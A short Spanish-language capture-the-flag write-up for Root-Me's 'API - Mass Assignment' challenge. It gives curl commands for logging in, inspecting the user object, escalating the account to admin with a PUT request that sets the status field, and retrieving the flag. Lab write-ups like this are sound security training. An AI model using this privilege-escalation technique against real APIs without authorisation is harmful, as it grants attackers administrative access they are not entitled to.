Write-up: API - Mass Assignment
Categoría: Web - API Plataforma: Root-Me

1. Autenticación y Captura de Sesión
Primero, en el panel de Swagger nos logueamos con un usuario previamente creado. Para mantener la persistencia de la sesión en nuestra terminal, extraemos las cookies utilizando la bandera -c de curl:

Bash

curl -X 'POST' \
  'http://challenge01.root-me.org:59090/api/login' \
  -H 'Content-Type: application/json' \
  -c cookies.txt \
  -d '{"username": "reos", "password": "password123"}'
2. Enumeración de la API
De ahí seguimos probando la API para revisar cómo funciona. Realizamos una petición al endpoint de obtención de usuario para entender la estructura de los datos que el servidor maneja sobre nuestra cuenta:

Bash

curl -X 'GET' 'http://challenge01.root-me.org:59090/api/user' -b cookies.txt
Respuesta obtenida: {"note":"","status":"guest","userid":5,"username":"reos"}

3. Explotación de Mass Assignment
Nuestra tarea es la de realizar una modificación en los permisos que tenemos para pasarlos a admin. Esto se puede realizar en el endpoint de la obtención de usuario (y también se observó posibilidad en el de nota).

Para ello, cambiamos el método GET por un PUT y modificamos la cabecera de contenido para que acepte el contenido JSON que mandamos con el cambio del status:

Bash

curl -X 'PUT' 'http://challenge01.root-me.org:59090/api/user' \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"status": "admin"}'

4. Obtención de la Flag
Una vez que el servidor procesa la asignación masiva de atributos y cambia nuestro rol, procedemos a solicitar el recurso restringido:

Bash

curl -X 'GET' 'http://challenge01.root-me.org:59090/api/flag' -b cookies.txt
Resultado: Acceso concedido y obtención de la bandera.
